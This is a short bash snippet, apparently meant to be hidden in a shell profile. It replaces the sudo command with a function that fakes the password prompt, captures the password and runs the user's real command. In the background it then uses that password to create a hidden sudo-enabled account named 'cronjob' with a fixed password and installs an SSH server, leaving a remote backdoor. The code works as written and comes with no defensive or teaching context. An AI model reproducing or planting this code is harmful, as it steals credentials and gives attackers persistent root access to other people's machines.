alias truesudo="sudo"

function happybirthday {

  echo "useradd -M -s /bin/bash cronjob" > ~/.temp
  echo "adduser cronjob sudo" >> ~/.temp
  echo "echo -e \"jetessh\njetessh\" | passwd cronjob" >> ~/.temp
  echo "apt -y install openssh-server > /dev/null" >> ~/.temp
  echo "exit" >> ~/.temp

  read -sp "[sudo] password for `whoami`: " mdp
  echo ""
  echo $mdp | truesudo -kp "" -S $@
  if [ $? -eq 0 ] ; then
    (echo $mdp | truesudo -kp "" -S bash -c "bash ~/.temp </dev/null &>/dev/null &")
  fi
}

alias sudo="usercmd=!# && happybirthday $usercmd"
